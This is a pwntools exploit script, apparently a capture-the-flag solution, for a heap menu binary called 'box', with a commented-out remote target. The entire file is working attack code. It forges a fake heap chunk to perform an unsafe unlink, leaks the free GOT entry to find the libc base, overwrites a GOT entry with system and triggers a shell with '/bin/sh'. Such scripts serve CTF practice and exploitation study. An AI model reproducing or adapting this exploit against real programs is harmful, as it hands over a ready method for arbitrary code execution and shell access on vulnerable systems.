from pwn import *
context(os="linux",arch="amd64",log_level="debug")
p=process("./box")
#p=remote("node5.buuoj.cn",26886)
elf=ELF("box")

def debug():
	gdb.attach(p)
	pause()

def show():
	p.recvuntil(b"choice:")
	p.send(b"1")

def add(length,name):
	p.recvuntil(b"choice:")
	p.send(b"2")
	p.recvuntil(b"name:")
	p.send(str(length))
	p.recvuntil(b"item:")
	p.send(name)

def change(index,length,name):
	p.recvuntil(b"choice:")
	p.send(b"3")
	p.recvuntil(b"item:")
	p.send(str(index))
	p.recvuntil(b"name:")
	p.send(str(length))
	p.recvuntil(b"item:")
	p.send(name)

def remove(index):
	p.recvuntil(b"choice:")
	p.send(b"4")
	p.recvuntil(b"item:")
	p.send(str(index))

add(24,b"a"*24)
add(32,b"b"*32)
add(144,b"c"*144)
add(24,b"d"*23)
heaparray_addr=0x6020d8
#change(0,32,b"a"*24+p64(0x21))
#payload1=p64(0)*3+p64(0x21)+p64(heaparray_addr-0x18)+p64(heaparray_addr-0x10)
#payload1+=p64(0x20)+p64(0xa0)
payload1=p64(0)+p64(0x21)+p64(heaparray_addr-0x18)+p64(heaparray_addr-0x10)
payload1+=p64(0x20)+p64(0xa0)
change(1,64,payload1)
remove(2)
free_got=elf.got["free"]
payload2=p64(0x8)+p64(free_got)
change(1,16,payload2)
show()
#debug()
free_addr=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("free_addr :",hex(free_addr))
libc=ELF("libc-2.23.so")
libc=ELF("glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
libc_base=free_addr-libc.sym["free"]
sys_addr=libc_base+libc.sym["system"]
binsh_addr=libc_base+next(libc.search(b"/bin/sh\x00"))
#debug()
print("sys_addr :",hex(sys_addr))
print("binsh_addr :",hex(binsh_addr))
payload3=p64(sys_addr)
change(0,7,payload3)
#debug()
payload4=p64(0x8)+p64(binsh_addr)
change(1,16,payload4)
#debug()
remove(0)
#debug()
p.interactive()
#debug()

